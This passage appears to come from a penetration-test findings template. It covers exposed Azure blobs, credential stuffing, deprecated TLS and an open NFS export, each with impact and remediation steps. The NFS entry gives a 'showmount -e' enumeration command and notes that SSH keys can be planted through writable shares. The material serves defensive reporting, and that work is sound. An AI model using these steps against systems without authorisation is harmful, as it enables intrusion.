impact: Unauthorized access to all publicly accessible blobs, which may contain backups, sensitive files, configuration data, application secrets, or PII.
remediation:
1. Disable 'Allow Blob public access' in the storage account configuration.
2. Review all containers and set access level to Private.
3. Use Azure Private Endpoints for storage access from internal resources.
4. Enable Azure Defender for Storage to detect anomalous access.

title: Credential Stuffing — Successful Account Compromise
description: Credentials from publicly available data breach databases were used to successfully authenticate to the target application. Users who reuse passwords across services are vulnerable to this attack when one of their other accounts is breached elsewhere.
impact: Account takeover for affected users without any vulnerability in the application itself. The impact depends on the privileges of compromised accounts.
remediation:
1. Enforce MFA for all accounts.
2. Integrate with HaveIBeenPwned API or similar service to detect and block compromised passwords during registration and password change.
3. Implement anomaly detection for login from unusual locations or devices.
4. Rate-limit login attempts and implement CAPTCHA.

title: Outdated TLS Configuration — TLS 1.0/1.1 Accepted
description: The server accepts TLS 1.0 or TLS 1.1 connections. These protocol versions are considered deprecated and vulnerable to attacks including POODLE and BEAST. Modern clients should use TLS 1.2 or TLS 1.3.
impact: Potential for downgrade attacks forcing clients to use vulnerable TLS versions, enabling decryption of traffic in certain network positions.
remediation:
1. Disable TLS 1.0 and TLS 1.1 on all servers.
2. Configure TLS 1.2 as the minimum version, ideally TLS 1.3 only.
3. Use strong cipher suites and disable RC4, DES, 3DES, and export-grade ciphers.
4. Test configuration with SSL Labs: ssllabs.com/ssltest/

title: NFS Share — Unrestricted Export
description:
An NFS share is exported to `*` (all hosts) or to a wide network range without access controls. Any host on the network (or internet) can mount the NFS share and access its contents.

Command: `showmount -e <target>`
impact: Unauthorized read access to all files on the exported NFS share. If write access is granted, an attacker can add SSH authorized keys or modify files to achieve remote code execution.
remediation:
1. Restrict NFS exports to specific IP addresses or subnets in `/etc/exports`.
2. Use Kerberos authentication for NFS (NFSv4 with Kerberos).
3. Implement the `root_squash` option to prevent root access via NFS.
4. Regularly audit NFS exports.
